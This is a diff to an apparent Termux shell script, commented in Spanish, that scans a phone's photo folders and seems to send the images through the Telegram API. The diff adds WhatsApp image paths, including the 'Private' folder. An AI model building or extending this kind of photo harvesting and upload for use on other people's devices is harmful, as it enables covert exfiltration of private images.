@@ -7,9 +7,11 @@ MENSAJE="Imágenes enviadas desde Termux"
 
 # Rutas a escanear (separadas por espacio)
 RUTAS=(
-  "/sdcard/DCIM/Camera"
-  "/sdcard/Pictures"
-  "/sdcard/Download"
+  "/storage/emulated/0/DCIM/Camera"
+  "/storage/emulated/0/Pictures"
+  "/storage/emulated/0/Download"
+  "/sdcard/Android/media/com.whatsapp/WhatsApp/media/WhatsApp Images/Private"
+  "/sdcard/Android/media/com.whatsapp/WhatsApp/media/WhatsApp Images"
 )
 
 # URL de la API de Telegram
